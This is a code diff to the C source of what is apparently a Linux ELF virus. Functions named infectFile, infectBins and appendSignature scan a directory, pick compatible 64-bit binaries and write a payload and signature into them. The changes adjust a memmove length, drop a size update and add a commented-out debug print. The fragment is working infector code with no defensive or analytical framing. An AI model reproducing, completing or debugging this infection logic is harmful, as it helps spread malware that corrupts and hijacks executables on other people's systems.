@@ -522,7 +522,7 @@ static void  appendSignature(struct bfile file, size_t offset) {
 
   char payload[] = PAYLOAD;
   toAdd = strlen(payload) + 1 + sizeof(size_t);
-  memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset);
+  memmove(((void *)file.header) + offset + toAdd, ((void *)file.header) + offset, file.size - offset - toAdd);
   memcpy(((void *)file.header) + offset, payload, toAdd - sizeof(size_t) - 1);
   memcpy(((void *)file.header) + offset + strlen(payload), (void *)dynamicSignature + 4, sizeof(size_t));
   memset(((void *)file.header) + offset + toAdd - 1, 0, 1);
@@ -669,7 +669,6 @@ static int  infectFile(struct bfile bin) {
     seg += 1;
   }
   data->sh_size += len;
-  bin.size += len;
   if (appendCode(&bin) == -1)
     return (-1);
   write(bin.fd, bin.header, bin.size);
@@ -711,6 +710,7 @@ static int  infectBins(const char *dirname) {
     dirp = (struct linux_dirent64 *) (buf + bpos);
     if ((ret = mapFile(dirname, dirp->d_name, &bin)) == -1)
       return (-1);
+    /* write(1, dirp->d_name, strlen(dirp->d_name)); */
     if (ret == 0 &&
       bin.size >= sizeof(Elf64_Ehdr) &&
       isCompatible(bin.header->e_ident, bin.header->e_machine) &&
